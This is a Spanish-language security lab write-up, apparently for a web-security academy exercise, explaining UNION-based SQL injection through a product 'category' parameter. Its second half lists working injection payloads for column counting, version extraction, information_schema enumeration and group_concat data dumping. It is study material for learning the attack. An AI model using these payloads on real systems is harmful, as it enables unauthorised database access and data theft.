La vulnerabilidad está en el filtro de categoría de productos. Al interceptar la solicitud y modificar el parámetro ‘category’, podemos inyectar una consulta adicional que devuelva el valor del sistema.

El proceso consiste en:

- Interceptar la solicitud con Burp Suite y probar distintas combinaciones hasta determinar el número de columnas que devuelve la consulta y cuáles aceptan texto. En este caso, son dos columnas de texto.
- Una vez identificadas, se usa la función ‘**@@version**‘, propia de MySQL y SQL Server, para extraer información del motor y su versión.
- El símbolo ‘**#**‘ se utiliza como comentario para anular el resto de la consulta original.

Esta técnica demuestra cómo, con una inyección bien construida, es posible reconocer el entorno sin necesidad de credenciales o acceso especial.

**Quédate con esto**: Conocer el motor de base de datos desde fuera es el primer paso para afinar futuras inyecciones y adaptar payloads según el sistema objetivo.

------

+ Primero debemos de buscar el total de columnas existentes que nos muestra la Web
    + ' order by 10-- -
    + ' order by 5-- -
    + ' order by 2-- -
    + ' union select 1,2-- -
    + ' union select  'hola','markos'-- -
    + ' union select  @@version-- -
    + ' union select  1,schema_name from information_schema.schemata-- - (bases de datos)
    + ' union select  1,table_name from information_schema.tables where table_schema='DB'-- - (tablas de la base de datos)
    + ' union select  1,column_name from information_schema.columns where table_schema='DB' and table_name='TABLE'-- -
    + ' union select  1,column_name from information_schema.columns where table_schema='0xFFF' and table_name='0xAAA'-- - (Hex)
    + Pets' union select 1,group_concat(id,0x3a,category) from academy_labs.products-- -
    + Pets' union select 1,group_concat(id,':',category) from academy_labs.products-- -
    + ' union select NULL,table_name from information_schema.tables-- - (enumerar todas las tablas del gestor de BD)

